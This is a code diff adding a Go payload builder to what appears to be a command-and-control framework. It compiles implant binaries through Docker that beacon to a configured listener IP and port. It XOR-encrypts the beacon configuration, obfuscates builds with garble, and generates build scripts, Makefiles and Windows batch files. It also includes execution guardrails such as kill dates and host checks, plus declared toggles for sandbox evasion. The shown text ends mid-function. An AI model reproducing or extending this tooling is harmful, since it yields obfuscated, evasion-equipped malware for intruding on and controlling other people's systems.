@@ -1,0 +1,1386 @@
+// server/internal/builder/websocket/payload.go
+package builder
+
+import (
+	"c2/internal/websocket/agent"
+	"c2/internal/websocket/hub"
+	"c2/internal/websocket/listeners"
+	"context"
+	"crypto/rand"
+	"crypto/rsa"
+	"crypto/x509"
+	"database/sql"
+	"encoding/base64"
+	"encoding/json"
+	"encoding/pem"
+	"fmt"
+	"io"
+	"log"
+	"math"
+	"math/big"
+	"os"
+	"os/exec"
+	"strings"
+	"time"
+
+	"github.com/BurntSushi/toml"
+	"github.com/docker/docker/api/types/container"
+	"github.com/docker/docker/client"
+
+	"github.com/google/uuid"
+)
+
+const ChunkSize = 256 * 1024 // Reduced to 256 KB chunks
+
+// SafetyChecks represents the safety check configuration from the client
+type SafetyChecks struct {
+	Hostname     string        `json:"hostname,omitempty"`
+	Username     string        `json:"username,omitempty"`
+	Domain       string        `json:"domain,omitempty"`
+	FileCheck    *FileCheck    `json:"file_check,omitempty"`
+	Process      string        `json:"process,omitempty"`
+	KillDate     string        `json:"kill_date,omitempty"`
+	WorkingHours *WorkingHours `json:"working_hours,omitempty"`
+}
+
+type FileCheck struct {
+	Path      string `json:"path"`
+	MustExist bool   `json:"must_exist"`
+}
+
+type WorkingHours struct {
+	Start string `json:"start"`
+	End   string `json:"end"`
+}
+
+type PayloadConfig struct {
+	Sleep       int `toml:"sleep"`
+	Jitter      int `toml:"jitter"`
+	HTTPHeaders struct {
+		UserAgent     string `toml:"user_agent"`
+		ContentType   string `toml:"content_type"`
+		CustomHeaders []struct {
+			Name  string `toml:"name"`
+			Value string `toml:"value"`
+		} `toml:"custom_headers"`
+	} `toml:"http_headers"`
+}
+
+// HTTPRouteConfig represents the HTTP route configuration
+type HTTPRouteConfig struct {
+	GetHandlers []struct {
+		Path         string `toml:"path"`
+		Method       string `toml:"method"` // NEW: Custom HTTP method (defaults to GET)
+		Enabled      bool   `toml:"enabled"`
+		AuthRequired bool   `toml:"auth_required"`
+		Params       []struct {
+			Name   string `toml:"name"`
+			Type   string `toml:"type"`
+			Format string `toml:"format"`
+		} `toml:"params"`
+	} `toml:"get_handlers"`
+	PostHandlers []struct {
+		Path         string `toml:"path"`
+		Method       string `toml:"method"` // NEW: Custom HTTP method (defaults to POST)
+		Enabled      bool   `toml:"enabled"`
+		AuthRequired bool   `toml:"auth_required"`
+		Params       []struct {
+			Name   string `toml:"name"`
+			Type   string `toml:"type"`
+			Format string `toml:"format"`
+		} `toml:"params"`
+	} `toml:"post_handlers"`
+}
+
+type PayloadRequest struct {
+	Type string `json:"type"`
+	Data struct {
+		Listener     string       `json:"listener"`
+		Language     string       `json:"language"`
+		OS           string       `json:"os"`
+		Arch         string       `json:"arch"`
+		OutputPath   string       `json:"output_path"`
+		SafetyChecks SafetyChecks `json:"safety_checks,omitempty"` // Added safety checks
+	} `json:"data"`
+}
+
+type KeyPair struct {
+	PrivateKeyPEM string
+	PublicKeyPEM  string
+}
+
+type Builder struct {
+	dockerClient    *client.Client
+	listenerManager *listeners.Manager
+	hubClient       *hub.Hub
+	clientUsername  string
+	listener        *listeners.Listener
+	db              *sql.DB
+	agentClient     *agent.Client
+}
+
+type PayloadConfigWrapper struct {
+	PayloadConfig PayloadConfig   `toml:"payload_config"`
+	HTTPRoutes    HTTPRouteConfig `toml:"http_routes"`
+}
+
+type buildData struct {
+	initID         uuid.UUID
+	clientID       uuid.UUID
+	secret         string
+	keyPair        *KeyPair
+	xorKey         string
+	binaryName     string
+	connectionType string
+	os             string
+	arch           string
+	safetyChecks   SafetyChecks // Added safety checks to build data
+}
+
+func NewBuilder(manager *listeners.Manager, hubClient *hub.Hub, db *sql.DB, agentClient *agent.Client) (*Builder, error) {
+	cli, err := client.NewClientWithOpts(client.FromEnv)
+	if err != nil {
+		return nil, fmt.Errorf("failed to create docker client: %v", err)
+	}
+	return &Builder{
+		dockerClient:    cli,
+		listenerManager: manager,
+		hubClient:       hubClient,
+		db:              db,
+		agentClient:     agentClient,
+	}, nil
+}
+
+func (b *Builder) BuildPayload(ctx context.Context, req PayloadRequest, clientUsername string) error {
+	go func() {
+		if err := b.buildPayloadAsync(ctx, req, clientUsername); err != nil {
+			log.Printf("Error building payload: %v", err)
+			// Handle any client notification here if needed
+		}
+	}()
+	return nil
+}
+
+func (b *Builder) buildPayloadAsync(ctx context.Context, req PayloadRequest, clientUsername string) error {
+	if err := b.validateRequest(req); err != nil {
+		return err
+	}
+
+	listener, exists := b.listenerManager.GetListener(req.Data.Listener)
+	if !exists {
+		log.Printf("Error: Listener %s not found", req.Data.Listener)
+		return fmt.Errorf("listener %s not found", req.Data.Listener)
+	}
+
+	log.Printf("Building payload for listener: %s", listener.Name)
+	b.clientUsername = clientUsername
+	b.listener = listener
+
+	// Log safety checks for audit
+	b.logSafetyChecks(req.Data.SafetyChecks, clientUsername, req.Data.Listener)
+
+	// Load configuration
+	payloadConfig, err := b.loadPayloadConfig()
+	if err != nil {
+		return err
+	}
+
+	// Initialize build data with OS, arch, and safety checks
+	buildData, err := b.initializeBuildData(ctx, req)
+	if err != nil {
+		return err
+	}
+
+	// Register with agent service
+	if err := b.registerWithAgentService(ctx, buildData); err != nil {
+		return err
+	}
+
+	// Check if this is a project export request
+	if strings.ToLower(req.Data.Language) == "goproject" {
+		log.Printf("Project export requested instead of build")
+
+		// Generate constants.go and write to /shared with safety checks
+		if err := b.writeProjectFiles(buildData, payloadConfig); err != nil {
+			return err
+		}
+
+		// Run container with EXPORT_PROJECT flag to zip instead of compile
+		envVars := []string{
+			"EXPORT_PROJECT=TRUE",
+			fmt.Sprintf("OS=%s", strings.ToLower(buildData.os)),
+			fmt.Sprintf("PROJECT_ID=%s", buildData.clientID),
+			fmt.Sprintf("OUTPUT_FILENAME=%s_project.zip", strings.TrimSuffix(buildData.binaryName, ".exe")),
+		}
+
+		// Add safety check environment variables for project export
+		safetyEnvVars := b.prepareSafetyCheckEnvironment(buildData.safetyChecks)
+		envVars = append(envVars, safetyEnvVars...)
+
+		zipPath, err := b.buildPayloadBinary(ctx, fmt.Sprintf("%s_project.zip", strings.TrimSuffix(buildData.binaryName, ".exe")), envVars)
+		if err != nil {
+			return err
+		}
+
+		return b.sendAndCleanup(ctx, zipPath)
+	}
+
+	// Normal build continues here with safety checks
+	envVars, err := b.prepareBuildEnvironment(buildData, payloadConfig)
+	if err != nil {
+		return err
+	}
+
+	// Add safety check environment variables
+	safetyEnvVars := b.prepareSafetyCheckEnvironment(buildData.safetyChecks)
+	envVars = append(envVars, safetyEnvVars...)
+
+	binaryPath, err := b.buildPayloadBinary(ctx, buildData.binaryName, envVars)
+	if err != nil {
+		return err
+	}
+
+	return b.sendAndCleanup(ctx, binaryPath)
+}
+
+// prepareSafetyCheckEnvironment prepares environment variables for safety checks
+func (b *Builder) prepareSafetyCheckEnvironment(safetyChecks SafetyChecks) []string {
+	var envVars []string
+
+	if safetyChecks.Hostname != "" {
+		envVars = append(envVars, fmt.Sprintf("SAFETY_HOSTNAME=%s", safetyChecks.Hostname))
+	}
+
+	if safetyChecks.Username != "" {
+		envVars = append(envVars, fmt.Sprintf("SAFETY_USERNAME=%s", safetyChecks.Username))
+	}
+
+	if safetyChecks.Domain != "" {
+		envVars = append(envVars, fmt.Sprintf("SAFETY_DOMAIN=%s", safetyChecks.Domain))
+	}
+
+	if safetyChecks.FileCheck != nil && safetyChecks.FileCheck.Path != "" {
+		envVars = append(envVars, fmt.Sprintf("SAFETY_FILE_PATH=%s", safetyChecks.FileCheck.Path))
+		mustExist := "false"
+		if safetyChecks.FileCheck.MustExist {
+			mustExist = "true"
+		}
+		envVars = append(envVars, fmt.Sprintf("SAFETY_FILE_MUST_EXIST=%s", mustExist))
+	}
+
+	if safetyChecks.Process != "" {
+		envVars = append(envVars, fmt.Sprintf("SAFETY_PROCESS=%s", safetyChecks.Process))
+	}
+
+	if safetyChecks.KillDate != "" {
+		envVars = append(envVars, fmt.Sprintf("SAFETY_KILL_DATE=%s", safetyChecks.KillDate))
+	}
+
+	if safetyChecks.WorkingHours != nil {
+		if safetyChecks.WorkingHours.Start != "" {
+			envVars = append(envVars, fmt.Sprintf("SAFETY_WORK_HOURS_START=%s", safetyChecks.WorkingHours.Start))
+		}
+		if safetyChecks.WorkingHours.End != "" {
+			envVars = append(envVars, fmt.Sprintf("SAFETY_WORK_HOURS_END=%s", safetyChecks.WorkingHours.End))
+		}
+	}
+
+	return envVars
+}
+
+// logSafetyChecks logs safety checks for audit purposes
+func (b *Builder) logSafetyChecks(safetyChecks SafetyChecks, username string, listenerName string) {
+	if safetyChecks.Hostname == "" && safetyChecks.Username == "" &&
+		safetyChecks.Domain == "" && safetyChecks.FileCheck == nil &&
+		safetyChecks.Process == "" && safetyChecks.KillDate == "" &&
+		safetyChecks.WorkingHours == nil {
+		log.Printf("[AUDIT] Payload for listener %s built by %s with no safety checks", listenerName, username)
+		return
+	}
+
+	log.Printf("[AUDIT] Payload for listener %s built by %s with safety checks:", listenerName, username)
+
+	if safetyChecks.Hostname != "" {
+		log.Printf("  - Hostname: %s", safetyChecks.Hostname)
+	}
+	if safetyChecks.Username != "" {
+		log.Printf("  - Username: %s", safetyChecks.Username)
+	}
+	if safetyChecks.Domain != "" {
+		log.Printf("  - Domain: %s", safetyChecks.Domain)
+	}
+	if safetyChecks.FileCheck != nil {
+		log.Printf("  - File Check: %s (must_exist: %v)",
+			safetyChecks.FileCheck.Path, safetyChecks.FileCheck.MustExist)
+	}
+	if safetyChecks.Process != "" {
+		log.Printf("  - Process: %s", safetyChecks.Process)
+	}
+	if safetyChecks.KillDate != "" {
+		log.Printf("  - Kill Date: %s", safetyChecks.KillDate)
+	}
+	if safetyChecks.WorkingHours != nil {
+		log.Printf("  - Working Hours: %s - %s",
+			safetyChecks.WorkingHours.Start, safetyChecks.WorkingHours.End)
+	}
+}
+
+// Updated writeProjectFiles to include safety checks in the generated code
+func (b *Builder) writeProjectFiles(data *buildData, config *PayloadConfigWrapper) error {
+	// Prepare custom headers JSON
+	customHeaders := make(map[string]string)
+	for _, header := range config.PayloadConfig.HTTPHeaders.CustomHeaders {
+		customHeaders[header.Name] = header.Value
+	}
+	headersJSON, _ := json.Marshal(customHeaders)
+
+	// Extract GET handler details including custom method
+	getMethod := "GET" // Default
+	var getRoute string
+	var getClientIDParam struct {
+		Name   string
+		Format string
+	}
+
+	for _, handler := range config.HTTPRoutes.GetHandlers {
+		if handler.Enabled {
+			getRoute = handler.Path
+			// Check for custom method
+			if handler.Method != "" {
+				getMethod = handler.Method
+			}
+			for _, param := range handler.Params {
+				if param.Type == "clientID_param" {
+					getClientIDParam.Name = param.Name
+					getClientIDParam.Format = param.Format
+					break
+				}
+			}
+			break
+		}
+	}
+
+	// Extract POST handler details including custom method
+	postMethod := "POST" // Default
+	var postRoute string
+	var postClientIDParam struct {
+		Name   string
+		Format string
+	}
+	var secretParam struct {
+		Name   string
+		Format string
+	}
+
+	for _, handler := range config.HTTPRoutes.PostHandlers {
+		if handler.Enabled {
+			postRoute = handler.Path
+			// Check for custom method
+			if handler.Method != "" {
+				postMethod = handler.Method
+			}
+			for _, param := range handler.Params {
+				switch param.Type {
+				case "clientID_param":
+					postClientIDParam.Name = param.Name
+					postClientIDParam.Format = param.Format
+				case "secret_param":
+					secretParam.Name = param.Name
+					secretParam.Format = param.Format
+				}
+			}
+			break
+		}
+	}
+
+	log.Printf("Project export with HTTP methods: GET=%s, POST=%s", getMethod, postMethod)
+
+	// Values that should be encrypted (matching prepareBuildEnvironment)
+	encryptedValues := map[string]string{
+		"publicKey":          data.keyPair.PublicKeyPEM,
+		"secret":             data.secret,
+		"protocol":           b.listener.Protocol,
+		"ip":                 b.listener.IP,
+		"port":               fmt.Sprintf("%d", b.listener.Port),
+		"getMethod":          getMethod,
+		"postMethod":         postMethod,
+		"userAgent":          config.PayloadConfig.HTTPHeaders.UserAgent,
+		"contentType":        config.PayloadConfig.HTTPHeaders.ContentType,
+		"customHeaders":      string(headersJSON),
+		"getRoute":           getRoute,
+		"postRoute":          postRoute,
+		"getClientIDName":    getClientIDParam.Name,
+		"getClientIDFormat":  getClientIDParam.Format,
+		"postClientIDName":   postClientIDParam.Name,
+		"postClientIDFormat": postClientIDParam.Format,
+		"postSecretName":     secretParam.Name,
+		"postSecretFormat":   secretParam.Format,
+	}
+
+	// Encrypt all values including the methods
+	for k, v := range encryptedValues {
+		encryptedValues[k] = xorEncrypt(v, data.xorKey)
+	}
+
+	// Build safety check comment for documentation
+	safetyCheckComment := ""
+	if data.safetyChecks.Hostname != "" || data.safetyChecks.Username != "" ||
+		data.safetyChecks.Domain != "" || data.safetyChecks.FileCheck != nil ||
+		data.safetyChecks.Process != "" || data.safetyChecks.KillDate != "" ||
+		data.safetyChecks.WorkingHours != nil {
+		safetyCheckComment = "\n// Safety Checks Configured:"
+		if data.safetyChecks.Hostname != "" {
+			safetyCheckComment += fmt.Sprintf("\n// - Hostname: %s", data.safetyChecks.Hostname)
+		}
+		if data.safetyChecks.Username != "" {
+			safetyCheckComment += fmt.Sprintf("\n// - Username: %s", data.safetyChecks.Username)
+		}
+		if data.safetyChecks.Domain != "" {
+			safetyCheckComment += fmt.Sprintf("\n// - Domain: %s", data.safetyChecks.Domain)
+		}
+		if data.safetyChecks.FileCheck != nil {
+			safetyCheckComment += fmt.Sprintf("\n// - File: %s (must_exist: %v)",
+				data.safetyChecks.FileCheck.Path, data.safetyChecks.FileCheck.MustExist)
+		}
+		if data.safetyChecks.Process != "" {
+			safetyCheckComment += fmt.Sprintf("\n// - Process: %s", data.safetyChecks.Process)
+		}
+		if data.safetyChecks.KillDate != "" {
+			safetyCheckComment += fmt.Sprintf("\n// - Kill Date: %s", data.safetyChecks.KillDate)
+		}
+		if data.safetyChecks.WorkingHours != nil {
+			safetyCheckComment += fmt.Sprintf("\n// - Working Hours: %s - %s",
+				data.safetyChecks.WorkingHours.Start, data.safetyChecks.WorkingHours.End)
+		}
+	}
+
+	// Create init_variables.go with safety checks included
+	initContent := fmt.Sprintf(`package main
+
+// Auto-generated for project export
+// Generated: %s
+// Target: %s/%s
+// HTTP Methods: GET=%s, POST=%s%s
+// XOR Key is embedded for decryption at runtime
+
+// Declare variables that will be set
+var (
+	// Non-encrypted values
+	xorKey   string
+	clientID string
+	sleep    string
+	jitter   string
+
+	// Encrypted values
+	getMethod          string
+	postMethod         string
+	userAgent          string
+	contentType        string
+	customHeaders      string
+	getRoute           string
+	postRoute          string
+	getClientIDName    string
+	getClientIDFormat  string
+	postClientIDName   string
+	postClientIDFormat string
+	postSecretName     string
+	postSecretFormat   string
+	publicKey          string
+	secret             string
+	protocol           string
+	ip                 string
+	port               string
+
+	// Safety check variables
+	safetyHostname       string = "%s"
+	safetyUsername       string = "%s"
+	safetyDomain         string = "%s"
+	safetyFilePath       string = "%s"
+	safetyFileMustExist  string = "%s"
+	safetyProcess        string = "%s"
+	safetyKillDate       string = "%s"
+	safetyWorkHoursStart string = "%s"
+	safetyWorkHoursEnd   string = "%s"
+
+	// Toggle variables
+	toggleCheckEnvironment     string
+	toggleCheckTimeDiscrepancy string
+	toggleCheckMemoryPatterns  string
+	toggleCheckParentProcess   string
+	toggleCheckLoadedLibraries string
+	toggleCheckDockerContainer string
+	toggleCheckProcessList     string
+)
+
+func init() {
+	// Set non-encrypted values
+	xorKey = "%s"
+	clientID = "%s"
+	sleep = "%d"
+	jitter = "%d"
+	
+	// Set encrypted values (these are XOR encrypted and base64 encoded)
+	getMethod = "%s"
+	postMethod = "%s"
+	userAgent = "%s"
+	contentType = "%s"
+	customHeaders = "%s"
+	getRoute = "%s"
+	postRoute = "%s"
+	getClientIDName = "%s"
+	getClientIDFormat = "%s"
+	postClientIDName = "%s"
+	postClientIDFormat = "%s"
+	postSecretName = "%s"
+	postSecretFormat = "%s"
+	publicKey = "%s"
+	secret = "%s"
+	protocol = "%s"
+	ip = "%s"
+	port = "%s"
+}
+`,
+		time.Now().Format(time.RFC3339),
+		data.os, data.arch,
+		getMethod, postMethod,
+		safetyCheckComment,
+		// Safety check values
+		data.safetyChecks.Hostname,
+		data.safetyChecks.Username,
+		data.safetyChecks.Domain,
+		func() string {
+			if data.safetyChecks.FileCheck != nil {
+				return data.safetyChecks.FileCheck.Path
+			}
+			return ""
+		}(),
+		func() string {
+			if data.safetyChecks.FileCheck != nil && data.safetyChecks.FileCheck.MustExist {
+				return "true"
+			}
+			return "false"
+		}(),
+		data.safetyChecks.Process,
+		data.safetyChecks.KillDate,
+		func() string {
+			if data.safetyChecks.WorkingHours != nil {
+				return data.safetyChecks.WorkingHours.Start
+			}
+			return ""
+		}(),
+		func() string {
+			if data.safetyChecks.WorkingHours != nil {
+				return data.safetyChecks.WorkingHours.End
+			}
+			return ""
+		}(),
+		// Regular values
+		data.xorKey,
+		data.clientID,
+		config.PayloadConfig.Sleep,
+		config.PayloadConfig.Jitter,
+		encryptedValues["getMethod"],
+		encryptedValues["postMethod"],
+		encryptedValues["userAgent"],
+		encryptedValues["contentType"],
+		encryptedValues["customHeaders"],
+		encryptedValues["getRoute"],
+		encryptedValues["postRoute"],
+		encryptedValues["getClientIDName"],
+		encryptedValues["getClientIDFormat"],
+		encryptedValues["postClientIDName"],
+		encryptedValues["postClientIDFormat"],
+		encryptedValues["postSecretName"],
+		encryptedValues["postSecretFormat"],
+		encryptedValues["publicKey"],
+		encryptedValues["secret"],
+		encryptedValues["protocol"],
+		encryptedValues["ip"],
+		encryptedValues["port"],
+	)
+
+	// Write init_variables.go
+	if err := os.WriteFile(fmt.Sprintf("/shared/%s_init_variables.go", data.clientID), []byte(initContent), 0644); err != nil {
+		return err
+	}
+
+	// Determine binary extension
+	binaryExt := ""
+	if data.os == "windows" {
+		binaryExt = ".exe"
+	}
+
+	// Create build script with note about custom methods and safety checks
+	buildScriptContent := fmt.Sprintf(`#!/bin/bash
+# Build script for payload - matches production build settings
+# Target: %s/%s
+# HTTP Methods: GET=%s, POST=%s
+# Generated: %s
+%s
+
+OUTPUT_NAME="payload_%s_%s%s"
+if [ "$1" != "" ]; then
+    OUTPUT_NAME="$1"
+fi
+
+echo "Building for %s/%s..."
+echo "Using HTTP methods: GET=%s, POST=%s"
+
+# Check if garble is installed
+if ! command -v garble &> /dev/null; then
+    echo "Warning: garble not found, building without obfuscation"
+    GOOS=%s GOARCH=%s go build \
+        -ldflags="-w -s -buildid=" \
+        -trimpath \
+        -o "${OUTPUT_NAME}" \
+        *.go
+else
+    echo "Building with garble obfuscation..."
+    GOOS=%s GOARCH=%s garble -seed=random -literals -tiny -debugdir=none build \
+        -ldflags="-w -s -buildid=" \
+        -trimpath \
+        -o "${OUTPUT_NAME}" \
+        *.go
+fi
+
+if [ $? -eq 0 ]; then
+    echo "Build successful: ${OUTPUT_NAME}"
+    ls -lh "${OUTPUT_NAME}"
+else
+    echo "Build failed"
+    exit 1
+fi
+`,
+		data.os, data.arch,
+		getMethod, postMethod,
+		time.Now().Format(time.RFC3339),
+		strings.ReplaceAll(safetyCheckComment, "// ", "# "),
+		data.os, data.arch, binaryExt,
+		data.os, data.arch,
+		getMethod, postMethod,
+		data.os, data.arch,
+		data.os, data.arch,
+	)
+
+	if err := os.WriteFile(fmt.Sprintf("/shared/%s_build.sh", data.clientID), []byte(buildScriptContent), 0755); err != nil {
+		return err
+	}
+
+	// Create Makefile with custom methods and safety checks noted
+	makefileContent := fmt.Sprintf(`# Makefile for payload project
+# Target: %s/%s
+# HTTP Methods: GET=%s, POST=%s
+%s
+
+BINARY_NAME = payload_%s_%s%s
+GOOS = %s
+GOARCH = %s
+LDFLAGS = -w -s -buildid=
+GARBLE_FLAGS = -seed=random -literals -tiny -debugdir=none
+
+.PHONY: all build build-garble clean info
+
+all: build
+
+info:
+	@echo "Build configuration:"
+	@echo "  Target OS: $(GOOS)"
+	@echo "  Target Arch: $(GOARCH)"
+	@echo "  GET Method: %s"
+	@echo "  POST Method: %s"
+
+# Standard build without obfuscation
+build:
+	GOOS=$(GOOS) GOARCH=$(GOARCH) go build -ldflags="$(LDFLAGS)" -trimpath -o $(BINARY_NAME) *.go
+
+# Build with garble obfuscation
+build-garble:
+	GOOS=$(GOOS) GOARCH=$(GOARCH) garble $(GARBLE_FLAGS) build -ldflags="$(LDFLAGS)" -trimpath -o $(BINARY_NAME) *.go
+
+clean:
+	rm -f $(BINARY_NAME) $(BINARY_NAME).exe
+
+help:
+	@echo "Available targets:"
+	@echo "  make info          - Show build configuration"
+	@echo "  make build         - Build without obfuscation"
+	@echo "  make build-garble  - Build with garble obfuscation"
+	@echo "  make clean         - Remove built binaries"
+`,
+		data.os, data.arch,
+		getMethod, postMethod,
+		strings.ReplaceAll(safetyCheckComment, "// ", "# "),
+		data.os, data.arch, binaryExt,
+		data.os, data.arch,
+		getMethod, postMethod,
+	)
+
+	if err := os.WriteFile(fmt.Sprintf("/shared/%s_Makefile", data.clientID), []byte(makefileContent), 0644); err != nil {
+		return err
+	}
+
+	// Windows batch file if target is Windows
+	if data.os == "windows" {
+		buildBatContent := fmt.Sprintf(`@echo off
+REM Build script for Windows payload
+REM Target: %s/%s
+REM HTTP Methods: GET=%s, POST=%s
+%s
+
+set OUTPUT_NAME=payload_%s_%s.exe
+if NOT "%%1"=="" set OUTPUT_NAME=%%1
+
+echo Building for %s/%s...
+echo Using HTTP methods: GET=%s, POST=%s
+
+REM Check if garble exists
+where garble >nul 2>nul
+if %%ERRORLEVEL%% NEQ 0 (
+    echo Warning: garble not found, building without obfuscation
+    set GOOS=%s
+    set GOARCH=%s
+    go build -ldflags="-w -s -buildid=" -trimpath -o "%%OUTPUT_NAME%%" *.go
+) else (
+    echo Building with garble obfuscation...
+    set GOOS=%s
+    set GOARCH=%s
+    garble -seed=random -literals -tiny -debugdir=none build -ldflags="-w -s -buildid=" -trimpath -o "%%OUTPUT_NAME%%" *.go
+)
+
+if %%errorlevel%% equ 0 (
+    echo Build successful: %%OUTPUT_NAME%%
+    dir "%%OUTPUT_NAME%%"
+) else (
+    echo Build failed
+    exit /b 1
+)
+`,
+			data.os, data.arch,
+			getMethod, postMethod,
+			strings.ReplaceAll(safetyCheckComment, "// ", "REM "),
+			data.os, data.arch,
+			data.os, data.arch,
+			getMethod, postMethod,
+			data.os, data.arch,
+			data.os, data.arch,
+		)
+
+		if err := os.WriteFile(fmt.Sprintf("/shared/%s_build.bat", data.clientID), []byte(buildBatContent), 0644); err != nil {
+			return err
+		}
+	}
+
+	return nil
+}
+
+func (b *Builder) loadPayloadConfig() (*PayloadConfigWrapper, error) {
+	var config PayloadConfigWrapper
+	if _, err := toml.DecodeFile("/app/config.toml", &config); err != nil {
+		return nil, fmt.Errorf("failed to load payload config: %v", err)
+	}
+	return &config, nil
+}
+
+func (b *Builder) initializeBuildData(ctx context.Context, req PayloadRequest) (*buildData, error) {
+	keyPair, err := GenerateRSAKeyPair()
+	if err != nil {
+		return nil, fmt.Errorf("failed to generate key pair: %v", err)
+	}
+
+	clientID := uuid.New()
+	secret, err := GenerateRandomString(24)
+	if err != nil {
+		return nil, fmt.Errorf("failed to generate secret: %v", err)
+	}
+
+	xorKey, err := GenerateRandomString(16)
+	if err != nil {
+		return nil, fmt.Errorf("failed to generate XOR key: %v", err)
+	}
+
+	connectionType := "edge"
+	if strings.ToUpper(b.listener.Protocol) == "SMB" || strings.ToUpper(b.listener.Protocol) == "RPC" {
+		connectionType = "link"
+	}
+
+	binaryName := b.generateBinaryName(req)
+	initID := uuid.New()
+
+	data := &buildData{
+		initID:         initID,
+		clientID:       clientID,
+		secret:         secret,
+		keyPair:        keyPair,
+		xorKey:         xorKey,
+		binaryName:     binaryName,
+		connectionType: connectionType,
+		os:             strings.ToLower(req.Data.OS),
+		arch:           req.Data.Arch,
+		safetyChecks:   req.Data.SafetyChecks, // Store safety checks
+	}
+
+	// Store in database
+	if err := b.storeBuildData(ctx, data); err != nil {
+		return nil, err
+	}
+
+	return data, nil
+}
+
+func (b *Builder) generateBinaryName(req PayloadRequest) string {
+	timestamp := time.Now().Format("20060102_150405")
+	fileExtension := ".bin"
+	if strings.ToLower(req.Data.OS) == "windows" {
+		fileExtension = ".exe"
+	}
+	return fmt.Sprintf("%s_%s_%s_%s_%s_payload%s",
+		strings.ToLower(b.listener.Protocol),
+		strings.ToLower(req.Data.Language),
+		strings.ToLower(req.Data.Arch),
+		b.listener.Name,
+		timestamp,
+		fileExtension,
+	)
+}
+
+func (b *Builder) storeBuildData(ctx context.Context, data *buildData) error {
+	_, err := b.db.ExecContext(ctx, `
+        INSERT INTO inits (id, clientID, type, secret, os, arch, RSAkey)
+        VALUES ($1, $2, $3, $4, $5, $6, $7)
+    `,
+		data.initID,
+		data.clientID,
+		data.connectionType,
+		data.secret,
+		data.os,
+		data.arch,
+		data.keyPair.PrivateKeyPEM,
+	)
+	return err
+}
+
+func (b *Builder) registerWithAgentService(ctx context.Context, data *buildData) error {
+	initData := map[string]string{
+		"id":       data.initID.String(),
+		"clientID": data.clientID.String(),
+		"type":     data.connectionType,
+		"secret":   data.secret,
+		"os":       data.os,
+		"arch":     data.arch,
+		"rsaKey":   data.keyPair.PrivateKeyPEM,
+		"protocol": b.listener.Protocol,
+	}
+
+	grpcCtx, cancel := context.WithTimeout(ctx, 10*time.Second)
+	defer cancel()
+
+	return b.agentClient.RegisterInit(grpcCtx, initData)
+}
+
+// Updated prepareBuildEnvironment function to support custom HTTP methods
+func (b *Builder) prepareBuildEnvironment(data *buildData, config *PayloadConfigWrapper) ([]string, error) {
+	// First prepare custom headers
+	customHeaders := make(map[string]string)
+	for _, header := range config.PayloadConfig.HTTPHeaders.CustomHeaders {
+		customHeaders[header.Name] = header.Value
+	}
+	headersJSON, err := json.Marshal(customHeaders)
+	if err != nil {
+		return nil, fmt.Errorf("failed to marshal custom headers: %v", err)
+	}
+
+	// Extract GET handler details including custom method
+	getMethod := "GET" // Default
+	var getClientIDParam struct {
+		Name   string
+		Format string
+	}
+
+	// Find first enabled GET handler
+	var getRoute string
+	for _, handler := range config.HTTPRoutes.GetHandlers {
+		if handler.Enabled {
+			getRoute = handler.Path
+			// Check if handler has a custom method field
+			if handler.Method != "" {
+				getMethod = handler.Method
+			}
+			// Extract clientID param
+			for _, param := range handler.Params {
+				if param.Type == "clientID_param" {
+					getClientIDParam.Name = param.Name
+					getClientIDParam.Format = param.Format
+					break
+				}
+			}
+			break
+		}
+	}
+
+	// Extract POST handler details including custom method
+	postMethod := "POST" // Default
+	var postClientIDParam struct {
+		Name   string
+		Format string
+	}
+	var secretParam struct {
+		Name   string
+		Format string
+	}
+
+	// Find first enabled POST handler
+	var postRoute string
+	for _, handler := range config.HTTPRoutes.PostHandlers {
+		if handler.Enabled {
+			postRoute = handler.Path
+			// Check if handler has a custom method field
+			if handler.Method != "" {
+				postMethod = handler.Method
+			}
+			// Extract params
+			for _, param := range handler.Params {
+				switch param.Type {
+				case "clientID_param":
+					postClientIDParam.Name = param.Name
+					postClientIDParam.Format = param.Format
+				case "secret_param":
+					secretParam.Name = param.Name
+					secretParam.Format = param.Format
+				}
+			}
+			break
+		}
+	}
+
+	log.Printf("Building payload with HTTP methods: GET=%s, POST=%s", getMethod, postMethod)
+
+	// Values that should be encrypted
+	encryptedValues := map[string]string{
+		"PUBLIC_KEY":            data.keyPair.PublicKeyPEM,
+		"SECRET":                data.secret,
+		"PROTOCOL":              b.listener.Protocol,
+		"IP":                    b.listener.IP,
+		"PORT":                  fmt.Sprintf("%d", b.listener.Port),
+		"GET_METHOD":            getMethod,  // Add custom GET method
+		"POST_METHOD":           postMethod, // Add custom POST method
+		"USER_AGENT":            config.PayloadConfig.HTTPHeaders.UserAgent,
+		"CONTENT_TYPE":          config.PayloadConfig.HTTPHeaders.ContentType,
+		"CUSTOM_HEADERS":        string(headersJSON),
+		"GET_ROUTE":             getRoute,
+		"POST_ROUTE":            postRoute,
+		"GET_CLIENT_ID_NAME":    getClientIDParam.Name,
+		"GET_CLIENT_ID_FORMAT":  getClientIDParam.Format,
+		"POST_CLIENT_ID_NAME":   postClientIDParam.Name,
+		"POST_CLIENT_ID_FORMAT": postClientIDParam.Format,
+		"POST_SECRET_NAME":      secretParam.Name,
+		"POST_SECRET_FORMAT":    secretParam.Format,
+	}
+
+	// Encrypt all values
+	for k, v := range encryptedValues {
+		encryptedValues[k] = xorEncrypt(v, data.xorKey)
+	}
+
+	// Create base environment variables
+	envVars := []string{
+		"BUILD=TRUE",
+		fmt.Sprintf("XOR_KEY=%s", data.xorKey),
+		fmt.Sprintf("OS=%s", strings.ToLower(data.os)),
+		fmt.Sprintf("ARCH=%s", data.arch),
+		fmt.Sprintf("OUTPUT_FILENAME=%s", data.binaryName),
+		fmt.Sprintf("CLIENTID=%s", data.clientID),
+		fmt.Sprintf("SLEEP=%d", config.PayloadConfig.Sleep),
+		fmt.Sprintf("JITTER=%d", config.PayloadConfig.Jitter),
+	}
+
+	// Add encrypted values to environment variables
+	for k, v := range encryptedValues {
+		envVars = append(envVars, fmt.Sprintf("%s=%s", k, v))
+	}
+
+	return envVars, nil
+}
+
+func (b *Builder) buildPayloadBinary(ctx context.Context, binaryName string, envVars []string) (string, error) {
+	config := &container.Config{
+		Image: "docker_builder:latest",
+		Env:   envVars,
+		Tty:   true,
+	}
+
+	// Get the host payloads path from environment variable
+	// This is set by docker-compose using ${PWD}/payloads
+	hostPayloadsPath := os.Getenv("HOST_PAYLOADS_PATH")
+	if hostPayloadsPath == "" {
+		return "", fmt.Errorf("HOST_PAYLOADS_PATH environment variable not set - check docker-compose.yml")
+	}
+
+	log.Printf("[Builder] Using host payloads path: %s", hostPayloadsPath)
+
+	hostConfig := &container.HostConfig{
+		NetworkMode: "host",
+		Binds: []string{
+			"/shared:/shared",
